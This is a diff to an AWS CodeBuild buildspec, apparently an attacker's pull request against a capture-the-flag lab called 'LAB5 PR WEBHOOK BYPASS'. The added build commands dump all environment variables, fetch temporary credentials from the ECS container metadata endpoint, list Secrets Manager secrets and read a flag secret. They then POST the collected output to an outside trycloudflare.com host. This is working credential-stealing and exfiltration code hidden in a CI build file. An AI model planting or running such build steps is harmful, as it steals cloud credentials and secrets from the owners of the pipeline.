@@ -3,10 +3,30 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "=== LAB5 PR WEBHOOK BYPASS ==="
-      - env | sort
-      - echo "=== AWS CREDS ATTEMPT ==="
-      - curl -s -m 10 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" || echo "no-ecs-creds"
-      - echo "=== SECRETS ==="
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text 2>&1 || echo "no-secret-access"
-      - echo "=== DONE ==="
+      - |
+        {
+          echo "=== LAB5 BUILD CONTEXT ==="
+          echo "BUILD_ID: $CODEBUILD_BUILD_ID"
+          echo "INITIATOR: $CODEBUILD_INITIATOR"
+          echo "SOURCE_VERSION: $CODEBUILD_RESOLVED_SOURCE_VERSION"
+          echo "SOURCE_REPO: $CODEBUILD_SOURCE_REPO_URL"
+          echo "WEBHOOK_EVENT: $CODEBUILD_WEBHOOK_EVENT"
+          echo "WEBHOOK_TRIGGER: $CODEBUILD_WEBHOOK_TRIGGER"
+          echo "WEBHOOK_HEAD_REF: $CODEBUILD_WEBHOOK_HEAD_REF"
+          echo "WEBHOOK_BASE_REF: $CODEBUILD_WEBHOOK_BASE_REF"
+          echo "WEBHOOK_ACTOR: $CODEBUILD_WEBHOOK_ACTOR_ACCOUNT_ID"
+          echo "PR_NUMBER: $CODEBUILD_WEBHOOK_MERGE_COMMIT"
+          echo "=== ENV ==="
+          env | sort
+          echo "=== AWS IDENTITY ==="
+          aws sts get-caller-identity 2>&1 || echo "no-aws"
+          echo "=== ECS CREDS ==="
+          curl -s -m 10 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" 2>&1 | head -c 500 || echo "no-ecs"
+          echo ""
+          echo "=== SECRETS LIST ==="
+          aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>&1 || echo "no-list"
+          echo "=== FLAG ==="
+          aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text 2>&1 || echo "no-get"
+          echo "=== DONE ==="
+        } > /tmp/lab5out.txt 2>&1
+      - "curl -s -m 25 -X POST https://hazardous-artistic-arrested-classroom.trycloudflare.com/lab5 -H 'Content-Type: text/plain' --data-binary @/tmp/lab5out.txt || echo UPLOADFAIL"
